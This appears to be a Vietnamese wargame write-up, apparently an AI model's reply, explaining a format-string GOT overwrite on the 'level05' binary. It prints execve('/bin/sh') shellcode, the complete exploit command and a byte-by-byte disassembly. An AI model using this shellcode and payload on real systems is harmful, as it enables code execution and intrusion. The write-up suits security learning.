RELRO                STACK CANARY        NX                   PIE             RPATH        RUNPATH         FILE
No RELRO 🔴     No canary found 🔴   NX disabled 🔴      No PIE 🔴       No RPATH 🟢   No RUNPATH 🟢   /home/users/level05/level05
-----
Chúc mừng bạn đã chinh phục được **Level 05**! Đây là một trong những kỹ thuật tấn công bộ nhớ "đẹp mắt" nhất: **GOT Overwrite**.

Dưới đây là bản nhật ký chi tiết để bạn lưu lại làm tư liệu học tập.

---

# 📒 NHẬT KÝ KHAI THÁC: LEVEL 05 @ OVERRIDE

## 1. Phân tích hiện trạng (Reconnaissance)

* **Checksec:**
* **No RELRO 🔴**: Đây là điểm yếu chí mạng, cho phép chúng ta ghi đè vào bảng địa chỉ hàm (GOT).
* **NX disabled 🔴**: Stack/Memory có thể thực thi mã.
* **No Canary 🔴**: Không có lính canh bảo vệ luồng thực thi.


* **Mã nguồn (Ghidra):**
* Có một vòng lặp tự động chuyển chữ hoa thành chữ thường bằng cách XOR với `0x20`. Nếu ta để shellcode trực tiếp trong buffer nhập vào, nó sẽ bị hỏng.
* Lỗ hổng chính: **`printf(local_78);`** — Một lỗi **Format String** điển hình.



---

## 2. Chiến thuật: GOT Overwrite + Environment Variable

Vì chương trình kết thúc bằng hàm `exit(0)`, chúng ta sẽ "đánh tráo" địa chỉ của hàm `exit` trong bảng **GOT (Global Offset Table)** để nó trỏ thẳng vào Shellcode của chúng ta.

### Tại sao dùng Biến môi trường (Environment Variable)?

Do chương trình có vòng lặp chuyển đổi ký tự (tolower), nếu ta nhập shellcode trực tiếp qua `fgets`, các byte mã máy sẽ bị thay đổi và không chạy được. Biến môi trường nằm ở vùng nhớ cao trên Stack, hoàn toàn không bị ảnh hưởng bởi logic của chương trình.

---

## 3. Các bước thực hiện (Execution Steps)

### Bước 1: Giấu Shellcode

Ta tạo một biến môi trường tên `SHELLCODE` chứa 1000 byte NOP (`\x90`) để tạo "đường trượt", giúp tăng tỉ lệ thành công khi nhảy vào.

```bash
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

```

### Bước 2: Tìm địa chỉ mục tiêu

1. **Địa chỉ cần ghi đè (Where to write):** Dùng `objdump -R ./level05 | grep exit`. Kết quả: `0x080497e0`.
2. **Địa chỉ cần ghi vào (What to write):** Địa chỉ của `SHELLCODE` trên Stack. Qua tính toán/GDB, ta chọn một điểm nằm giữa đường trượt NOP: `0xffffd888`.

### Bước 3: Tính toán Format String Payload

Ta sử dụng kỹ thuật **Half-Write (`%hn`)** để ghi mỗi lần 2 byte, giúp chương trình ổn định hơn.

* Ghi `0xd888` (thập phân: 55432) vào địa chỉ `0x080497e0`.
* Ghi `0xffff` (thập phân: 65535) vào địa chỉ `0x080497e2`.

**Toán học cho Payload:**

1. **Độ dài địa chỉ:** 2 địa chỉ (4 byte mỗi cái) = **8 ký tự**.
2. **In cụm 1:** $55432 - 8 = \mathbf{55424}$.
3. **In cụm 2:** $65535 - 55432 = \mathbf{10103}$.
4. **Offset:** Vị trí dữ liệu của ta trên Stack bắt đầu từ vị trí thứ **10**.

---

## 4. Lệnh khai thác cuối cùng

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55424d" + "%10$hn" + "%10103d" + "%11$hn"'; cat) | ./level05

```

**Nguyên lý hoạt động:**

1. `printf` được gọi, in ra hàng vạn dấu cách để đạt đủ số lượng ký tự mong muốn.
2. Khi gặp `%hn`, nó ghi tổng số ký tự đã in vào địa chỉ tương ứng trong bảng GOT.
3. Khi lệnh `exit(0)` chạy, thay vì thoát, CPU tra bảng GOT và nhảy thẳng tới `0xffffd888`.
4. CPU "trượt" qua các lệnh NOP và thực thi mã độc mở Shell.

---

## 5. Bài học rút ra

* **RELRO là gì?** Nó là lớp bảo vệ khiến bảng GOT trở thành "Chỉ đọc" (Read-only). Nếu không có RELRO, bất kỳ hàm thư viện nào cũng có thể bị "đánh tráo".
* **Format String không chỉ để đọc:** Với tham số `%n`, nó trở thành một công cụ ghi đè bộ nhớ cực kỳ mạnh mẽ.
* **Tầm quan trọng của NOP Sled:** Khi địa chỉ bộ nhớ có thể dao động nhẹ, một dải NOP lớn là "tấm lưới" an toàn để bắt lấy luồng thực thi của CPU.

------------------- "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" ------

Chuỗi ký tự trông như "mật mã Matrix" này thực chất là một đoạn **Shellcode** kinh điển dành cho kiến trúc **Linux x86 (32-bit)**.

Mục tiêu duy nhất của đoạn mã máy này là thực hiện hàm hệ thống (syscall) `execve("/bin/sh", NULL, NULL)` để mở một cửa sổ dòng lệnh (shell).

Hãy cùng "giải phẫu" từng byte một để xem CPU thực sự làm gì khi đọc chúng:

---

### 1. Chuyển đổi từ Hex sang Assembly (Mã máy)

Đoạn hex này tương ứng với các chỉ thị Assembly sau đây:

| Byte (Hex) | Assembly | Giải thích đơn giản |
| --- | --- | --- |
| `\x31\xc0` | `xor eax, eax` | Xóa sạch thanh ghi `eax` (đưa về số 0). |
| `\x50` | `push eax` | Đưa số 0 lên Stack để làm ký tự kết thúc chuỗi (`\0`). |
| `\x68\x2f\x2f\x73\x68` | `push 0x68732f2f` | Đưa chuỗi `//sh` lên Stack (dạng ngược vì Little Endian). |
| `\x68\x2f\x62\x69\x6e` | `push 0x6e69622f` | Đưa chuỗi `/bin` lên Stack. Tổng lại ta có `/bin//sh`. |
| `\x89\xe3` | `mov ebx, esp` | Đưa địa chỉ của chuỗi trên Stack vào `ebx` (Tham số 1 của execve). |
| `\x50` | `push eax` | Đưa NULL (0) lên Stack làm tham số `envp`. |
| `\x53` | `push ebx` | Đưa địa chỉ chuỗi `/bin/sh` lên Stack làm tham số `argv`. |
| `\x89\xe1` | `mov ecx, esp` | Đưa địa chỉ của mảng `argv` vào `ecx` (Tham số 2). |
| `\xb0\x0b` | `mov al, 0xb` | Gán số **11** ($0x0b$) vào `eax`. Đây là mã hiệu của hàm `execve`. |
| `\xcd\x80` | `int 0x80` | "Gõ cửa" Kernel để thực hiện lệnh. |

---

### 2. Tại sao phải làm phức tạp như vậy?

Bạn có thể thắc mắc: *"Tại sao không viết thẳng /bin/sh mà phải đẩy từng chút lên Stack?"*.

Câu trả lời nằm ở các giới hạn khi tấn công bộ nhớ:

* **Tránh ký tự NULL (`\x00`)**: Trong ngôn ngữ C, byte `00` sẽ kết thúc chuỗi. Nếu shellcode của bạn có byte `00`, các hàm như `gets()` hay `strcpy()` sẽ ngừng đọc và shellcode bị cắt cụt. Đó là lý do ta dùng `xor eax, eax` thay vì `mov eax, 0`.
* **Tính linh động**: Shellcode này không phụ thuộc vào việc nó nằm ở đâu trong bộ nhớ. Nó tự tạo ra chuỗi `/bin/sh` ngay trên Stack tại thời điểm nó chạy.
* **Bypass bộ lọc**: Việc dùng `/bin//sh` (2 dấu gạch chéo) thay vì `/bin/sh` là để làm cho chuỗi có độ dài chia hết cho 4 byte, giúp việc `push` lên Stack dễ dàng hơn và Linux vẫn hiểu đó là đường dẫn đúng.

---

### 3. Quy trình thực hiện Syscall (Nguyên lý chung)

Để mở được Shell, đoạn mã này phải chuẩn bị "hiện trường" cho hàm `execve` như sau trước khi gọi `int 0x80`:

1. **Thanh ghi EAX**: Phải chứa số hiệu hàm (với `execve` là **11**).
2. **Thanh ghi EBX**: Chứa địa chỉ của chuỗi đường dẫn (`"/bin/sh"`).
3. **Thanh ghi ECX**: Chứa địa chỉ của mảng tham số (thường là địa chỉ của chính chuỗi đó và một số 0).
4. **Thanh ghi EDX**: Chứa địa chỉ của biến môi trường (thường để là 0/NULL).

### Tóm lại

Chuỗi này giống như một **"lệnh vạn năng"** ở mức thấp nhất mà CPU có thể hiểu được. Khi bạn đưa nó vào bộ nhớ và ép CPU nhảy vào đó, CPU sẽ ngừng chạy chương trình cũ và thực hiện lệnh mở một cửa sổ Shell mới với quyền hạn của chương trình đó.

Đó chính là lý do vì sao trong các bài Lab trước, chỉ cần "leak" được địa chỉ và trỏ CPU vào đúng chỗ có chuỗi này là bạn chiếm được quyền điều khiển!